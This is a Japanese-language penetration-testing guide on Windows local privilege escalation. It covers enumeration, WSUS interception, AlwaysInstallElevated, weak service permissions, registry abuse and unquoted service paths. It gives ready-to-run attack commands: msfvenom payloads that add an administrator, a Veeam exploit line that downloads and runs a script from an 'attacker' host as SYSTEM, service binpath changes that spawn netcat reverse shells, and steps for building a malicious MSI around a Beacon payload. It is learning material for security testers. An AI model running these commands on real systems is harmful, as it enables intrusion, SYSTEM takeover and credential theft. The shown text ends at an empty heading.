# Windows ローカル権限昇格

{{#include ../../banners/hacktricks-training.md}}

### **Windows ローカル権限昇格ベクトルを探すための最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows の基礎理論

### Access Tokens

**Windows Access Tokens が何か分からない場合は、続行する前に以下のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs の詳細については、以下のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity levels が何か分からない場合は、続行する前に以下のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows セキュリティ制御

Windows には、**システムの列挙を妨げたり**、実行ファイルを実行できないようにしたり、さらには**アクティビティを検出したりする**さまざまな要素があります。Privilege Escalation の列挙を開始する前に、以下の**ページを読み**、これらすべての**防御メカニズム**を**列挙**してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess サイレント昇格

`RAiLaunchAdminProcess` を通じて起動された UIAccess プロセスは、AppInfo の secure-path チェックがバイパスされた場合、プロンプトなしで High IL に到達するために悪用できます。専用の UIAccess/Admin Protection bypass workflow については、こちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop の accessibility registry propagation は、任意の SYSTEM registry write（RegPwn）に悪用できます:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows build では、特権を持つローカル NTLM authentication が再利用された SMB TCP connection 上で反映される、**SMB arbitrary-port** LPE path も導入されています:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## システム情報

### Version info の列挙

Windows version に既知の vulnerability があるか確認してください（適用された patches も確認してください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

この [site](https://msrc.microsoft.com/update-guide/vulnerability) は、Microsoft の security vulnerabilities に関する詳細情報を検索するのに便利です。この database には 4,700 件を超える security vulnerabilities が登録されており、Windows environment が示す **massive attack surface** がわかります。

**システム上**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas には watson が組み込まれています)_

**システム情報を使用してローカルで**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploits の Github repos:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

env variables に credential/Juicy info が保存されていないか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShellの履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript ファイル

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) で、これを有効にする方法を確認できます。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline の実行に関する詳細が記録されます。これには、実行されたコマンド、コマンドの呼び出し、スクリプトの一部が含まれます。ただし、実行の完全な詳細や出力結果は記録されない場合があります。

これを有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、**「Powershell Transcription」**ではなく**「Module Logging」**を選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell ログの最後の15件のイベントを表示するには、次を実行します:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

script の実行に関する完全な activity と全内容の記録が取得され、実行時にすべてのコードブロックが記録されます。このプロセスにより、各 activity の包括的な audit trail が保持され、forensics や悪意のある behavior の分析に役立ちます。実行時にすべての activity を記録することで、プロセスに関する詳細な insights が提供されます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block の logging event は、Windows Event Viewer の次のパスにあります：**Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
最後の 20 件の event を表示するには、次を使用します：
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新が http**S** ではなく http を使用して要求されている場合、システムを侵害できます。

まず、cmd で次のコマンドを実行し、ネットワークが非 SSL の WSUS 更新を使用しているか確認します。
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または、PowerShellで次のようにします:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような返信を受け取った場合:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
そして、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` が `1` と等しい場合、

**exploit可能です。** 最後のレジストリ値が `0` の場合、WSUSエントリは無視されます。

これらの脆弱性をexploitするには、[Wsuxploit](https://github.com/pimps/wsuxploit) や [pyWSUS ](https://github.com/GoSecure/pywsus) などのツールを使用できます。これらは、非SSLのWSUSトラフィックに`fake`な更新プログラムをinjectするための、MiTM weaponized exploit scriptです。

researchはこちらを参照してください：

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**完全なレポートはこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。\
基本的に、このbugがexploitするflawは次のとおりです：

> ローカルユーザーのproxyを変更でき、Windows UpdatesがInternet Explorerの設定で構成されたproxyを使用している場合、[PyWSUS](https://github.com/GoSecure/pywsus)をローカルで実行して自分自身のトラフィックをinterceptし、asset上でelevated userとしてcodeを実行できます。
>
> さらに、WSUS serviceはcurrent userの設定を使用するため、そのcertificate storeも使用します。WSUS hostname用のself-signed certificateを生成し、そのcertificateをcurrent userのcertificate storeに追加すると、HTTPおよびHTTPSのWSUSトラフィックの両方をinterceptできます。WSUSは、certificateに対するtrust-on-first-use型のvalidationを実装するHSTSのようなmechanismを使用していません。提示されたcertificateがuserによってtrustedであり、正しいhostnameを持っていれば、serviceによって受け入れられます。

このvulnerabilityは、[**WSUSpicious**](https://github.com/GoSecure/wsuspicious) toolを使用してexploitできます（liberatedされた後）。

## Third-Party Auto-Updaters and Agent IPC (local privesc)

多くのenterprise agentは、localhost IPC surfaceとprivileged update channelを公開しています。enrollmentをattacker serverへcoerceでき、updaterがrogue root CAまたはweak signer checkをtrustedする場合、local userはmalicious MSIをdeliverし、SYSTEM serviceにinstallさせることができます。Netskope stAgentSvc chain（CVE-2025-0309）をベースにしたgeneralized techniqueはこちらを参照してください：


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` は、**TCP/9401**上でlocalhost serviceを公開しており、attacker-controlled messageを処理することで、**NT AUTHORITY\SYSTEM**として任意のcommandを実行できます。

- **Recon**: listenerとversionを確認します。例：`netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。
- **Exploit**: 必要なVeeam DLLとともに`VeeamHax.exe`などのPoCを同じdirectoryに配置し、local socket経由でSYSTEM payloadをtriggerします：
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
サービスはコマンドを SYSTEM として実行します。
## KrbRelayUp

特定の条件下において、Windows **domain** 環境には **local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing が強制されていない**環境、ユーザーが **Resource-Based Constrained Delegation (RBCD)** を構成できる self-rights を持っていること、そしてユーザーが domain 内にコンピューターを作成できることが含まれます。重要なのは、これらの **requirements** が **default settings** で満たされる点です。

**exploit は** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) **で確認できます。**

攻撃のフローの詳細については、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) **を確認してください。**

## AlwaysInstallElevated

**これら 2 つのレジストリが** **有効**（値が **0x1**）になっている**場合**、任意の権限を持つユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として **install**（実行）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
meterpreter sessionがある場合は、**`exploit/windows/local/always_install_elevated`** moduleを使用してこの technique を自動化できます。

### PowerUP

power-upの`Write-UserAddMSI` commandを使用すると、privilegesをescalateするためのWindows MSI binaryをcurrent directory内に作成できます。この scriptは、user/groupの追加を促すprecompiled MSI installerを書き出します（そのため、GIU accessが必要です）。
```
Write-UserAddMSI
```
作成したバイナリを実行するだけで privileges を escalate できます。

### MSI Wrapper

この tools を使用して MSI wrapper を作成する方法については、この tutorial を読んでください。**execute** **command lines** だけが目的の場合は、"**.bat**" file を wrap できることに注意してください。


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX を使用して MSI を作成


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio を使用して MSI を作成

- Cobalt Strike または Metasploit で、`C:\privesc\beacon.exe` に **new Windows EXE TCP payload** を **Generate** する
- **Visual Studio** を開き、**Create a new project** を選択して、検索ボックスに "installer" と入力する。**Setup Wizard** project を選択し、**Next** をクリックする。
- project に **AlwaysPrivesc** などの名前を付け、location に **`C:\privesc`** を使用し、**place solution and project in the same directory** を選択して、**Create** をクリックする。
- step 3 of 4（include する files の選択）に到達するまで **Next** をクリックし続ける。**Add** をクリックして、先ほど Generate した Beacon payload を選択する。次に **Finish** をクリックする。
- **Solution Explorer** で **AlwaysPrivesc** project を選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更する。
- **Author** や **Manufacturer** など、installed app をより legitimate に見せるために変更できる properties もあります。
- project を右クリックして **View > Custom Actions** を選択する。
- **Install** を右クリックして **Add Custom Action** を選択する。
- **Application Folder** を double-click し、**beacon.exe** file を選択して **OK** をクリックする。これにより、installer の実行直後に Beacon payload が execute されます。
- **Custom Action Properties** で、**Run64Bit** を **True** に変更する。
- 最後に、**build** する。
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という warning が表示された場合は、platform を x64 に設定したことを確認する。

### MSI Installation

悪意のある `.msi` file の **installation** を **background** で execute するには：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を exploit するには、次を使用できます: _exploit/windows/local/always_install_elevated_

## Antivirus と検出器

### Audit Settings

これらの設定によって、何が**ログに記録される**かが決まるため、注意を払う必要があります。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding では、ログの送信先を把握できます。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、**ローカル Administrator パスワードの管理**を目的として設計されており、ドメインに参加しているコンピューターごとにパスワードが**一意で、ランダム化され、定期的に更新される**ことを保証します。これらのパスワードは Active Directory 内に安全に保存され、ACLs を通じて十分な権限を付与されたユーザーのみがアクセスでき、認可されている場合にローカル管理者パスワードを閲覧できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効になっている場合、**プレーンテキストのパスワードは LSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**このページの WDigest に関する詳細情報**](../stealing-credentials/credentials-protections.md#wdigest)。
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する強化された保護を導入し、信頼されていないプロセスによる **メモリの読み取り** やコードの注入を **ブロック** して、システムをさらに安全にしました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash attacks などの脅威から、デバイスに保存された credentials を保護することです。| [**Credentials Guard の詳細はこちら。**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**ドメイン資格情報**は **Local Security Authority**（LSA）によって認証され、オペレーティングシステムのコンポーネントで利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
[**Cached Credentialsの詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials)。
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループの列挙

所属しているグループに興味深い権限があるか確認します
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

**Privileged group に所属している場合、privilege escalation が可能なことがあります**。Privileged group と、それらを abuse して privilege escalation する方法については、こちらをご覧ください:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

このページで **token** について**詳しく学べます**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
次のページで**興味深い token** と、それらを abuse する方法について**学んでください**:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### ホームフォルダー
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダーのアクセス許可

まず、プロセスを一覧表示する際に、**プロセスのコマンドライン内にパスワードがないか確認します**。\
**実行中のバイナリを上書きできるか**、またはバイナリのフォルダーに対する書き込み権限があるかを確認し、可能な [**DLL Hijacking attacks**](dll-hijacking/index.html) を悪用します：
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に実行中の可能性がある [**electron/cef/chromium debuggers**] を確認してください。これを悪用して privileges を escalate できる可能性があります](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)。

**processes の binaries の permissions を確認**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリがあるフォルダーの権限を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

sysinternals の **procdump** を使用して、実行中のプロセスのメモリダンプを作成できます。FTP などのサービスは、**credentials がメモリ内に clear text で保存されている**ため、メモリをダンプして credentials を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEM として実行されているアプリケーションでは、ユーザーが CMD を起動したり、ディレクトリを参照したりできる場合があります。**

例：「Windows Help and Support」（Windows + F1）で「command prompt」を検索し、「Click to open Command Prompt」をクリックします。

## Services

Service Triggers により、特定の条件（named pipe/RPC endpoint のアクティビティ、ETW events、IP の可用性、デバイスの接続、GPO refresh など）が発生したときに Windows がサービスを起動できます。SERVICE_START 権限がなくても、トリガーを発火させることで、privileged services を起動できる場合があります。列挙および activation techniques については、こちらを参照してください：

-
{{#ref}}
service-triggers.md
{{#endref}}

サービスの一覧を取得します：
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

**sc** を使用してサービスの情報を取得できます
```bash
sc qc <service_name>
```
各サービスに必要な権限レベルを確認するため、_Sysinternals_ のバイナリ **accesschk** を用意しておくことを推奨します。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
「Authenticated Users」がサービスを変更できるか確認することを推奨します：
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP 用の accesschk.exe はここからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### service を有効化する

（例: SSDPSRV で）次のエラーが発生する場合:

_システム エラー 1058 が発生しました。_\
_サービスを開始できません。無効になっているか、有効なデバイスが関連付けられていないことが原因です。_

次のコマンドで有効化できます。
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**サービス upnphost が動作するには SSDPSRV に依存することに注意してください（XP SP1 の場合）**

**この問題に対する別の回避策**は、次を実行することです:
```
sc.exe config usosvc start= auto
```
### **サービスバイナリパスの変更**

「Authenticated users」グループがサービスに対する **SERVICE_ALL_ACCESS** を保有している場合、サービスの実行可能バイナリを変更できます。**sc** を変更して実行するには：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスを再起動する
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
権限は、以下のさまざまな権限を通じて昇格できます。

- **SERVICE_CHANGE_CONFIG**: service binary の再構成を許可します。
- **WRITE_DAC**: 権限の再構成を可能にし、service configurations を変更できるようにします。
- **WRITE_OWNER**: 所有権の取得と権限の再構成を許可します。
- **GENERIC_WRITE**: service configurations を変更する権限を継承します。
- **GENERIC_ALL**: service configurations を変更する権限も継承します。

この脆弱性の検出と exploitation には、_exploit/windows/local/service_permissions_ を利用できます。

### Services binaries weak permissions

service が **`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または privileged domain account として実行されている一方で、**low-privileged users が service EXE またはその親フォルダーを変更できる場合**、**binary を置き換えて service を再起動する**ことで、service を hijack できることがあります。

**service が実行する binary を変更できるか**、または binary が配置されている**フォルダーに対する write permissions があるかを確認してください**（[**DLL Hijacking**](dll-hijacking/index.html)**)。**\
**wmic**（system32 にはありません）を使用して service によって実行されるすべての binary を取得し、**icacls** を使用して権限を確認できます：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
**sc** と **icacls** も使用できます：
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
**`Everyone`**、**`BUILTIN\Users`**、または **`Authenticated Users`** に付与された危険な ACL を探します。特に、サービスの実行ファイルまたはそれを含むディレクトリに対する **`(F)`**、**`(M)`**、**`(W)`** に注目してください。実用的な abuse flow は次のとおりです。

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>` でバイナリが writable であることを確認します。
3. サービスバイナリを payload または有効な malicious service binary に置き換えます。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動します（または reboot / service trigger を待ちます）。

Useful automated checks:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> サービスが通常のユーザーによる再起動を許可していない場合は、起動時に自動的に開始されるか、再起動させる失敗時アクションが設定されているか、またはそのサービスを使用するアプリケーションによって間接的にトリガーできるかを確認してください。

### Services registry modify permissions

任意のサービス レジストリを変更できるか確認してください。\
以下を実行して、サービス **registry** に対する **permissions** を **check** できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているか確認する必要があります。持っている場合、service によって実行される binary を変更できます。

実行される binary の Path を変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### 任意の HKLM value write への Registry symlink race (ATConfig)

一部の Windows Accessibility 機能は、ユーザーごとの **ATConfig** key を作成します。これらの key は後に **SYSTEM** process によって HKLM session key へコピーされます。Registry **symbolic link race** により、この特権 write を **任意の HKLM path** へリダイレクトでき、任意の HKLM **value write** primitive が得られます。

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みの Accessibility features が一覧表示されます。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、user-controlled configuration が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` は logon/secure-desktop transitions 中に作成され、user が write できます。

Abuse flow (CVE-2026-24291 / ATConfig):

1. SYSTEM によって write させたい **HKCU ATConfig** value を設定します。
2. secure-desktop copy を trigger します（例: **LockWorkstation**）。これにより AT broker flow が開始されます。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定して **race に勝ちます**。oplock が発生したら、**HKLM Session ATConfig** key を、protected HKLM target への **registry link** に置き換えます。
4. SYSTEM が、redirect された HKLM path に attacker-chosen value を write します。

任意の HKLM value write を取得したら、service configuration values を overwrite して LPE へ pivot できます。

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

normal user が start できる service（例: **`msiserver`**）を選択し、write の後に trigger します。**Note:** public exploit implementation は race の一部として **workstation を lock** します。

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory 権限

レジストリに対してこの権限を持っている場合、**このレジストリからサブレジストリを作成できる**ことを意味します。Windows サービスの場合、これは**任意のコードを実行するのに十分です**:


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルへのパスが引用符で囲まれていない場合、Windows はスペースまでで終わる各パスを実行しようとします。

たとえば、パスが _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次を実行しようとします:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込み Windows サービスに属するものを除外して、引用符で囲まれていないサービス パスをすべて一覧表示します：
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**この脆弱性は** metasploit **で検出および悪用できます**：`exploit/windows/local/trusted\_service\_path` metasploit **でサービスバイナリを手動作成できます**：
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 回復アクション

